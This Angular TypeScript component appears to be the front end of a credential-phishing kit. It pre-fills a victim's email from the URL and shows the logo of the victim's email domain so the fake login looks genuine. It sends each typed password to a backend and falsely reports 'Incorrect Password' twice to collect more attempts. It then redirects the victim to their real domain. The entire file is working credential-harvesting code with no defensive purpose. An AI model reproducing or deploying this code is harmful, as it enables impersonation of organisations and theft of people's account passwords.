import { Component, OnInit } from '@angular/core';
import { ConfigService } from 'src/app/config/config.service';
import * as $ from 'jquery';
import { ActivatedRoute, Router } from '@angular/router';
import { ConditionalExpr } from '@angular/compiler';


@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.scss']
})
export class HomeComponent implements OnInit {
  form: any = {}
  forms: any 
  email:any
  string:any
  count:number = 0
  domains:any
  response:any
  constructor(private http:ConfigService,
    private router:ActivatedRoute,
    private route:Router) {
      let my_slice ='uber.com'
      this.router.queryParamMap.subscribe((param)=>{
        this.email = param.get('email')
        this.form.EmailAddress = this.email
        let value:any = this.email.lastIndexOf('@')+1
      let domain = this.email.substring(value)
      this.domains = domain
       this.string = domain.split(".")[0]
       this.forms = `https://logo.clearbit.com/${domain}`
      })
   }

  ngOnInit(): void {


  }

click(){
  console.log(this.form)
  if (!this.form.Password) {
    $('#error').show();
    $('#error').html("Password field is emply!");
}else{
  $('#error').hide();
  $('#submit-btn').val('Verifing...');
  this.http.getData(this.form).subscribe((res:any)=>{
    this.count++
    console.log(this.count)
    if(this.count < 3){
      $('#error').show();
      $('#error').html("Incorrect Password");
      $('#submit-btn').val('Login');

    }else{
      window.location.replace(`http://${this.domains}`);
    }
    this.response =res;

  },err=>{
    $('#error').show();
    $('#error').html("Invalid Password");
    $('#submit-btn').val('Submit');
  })
}


}

}
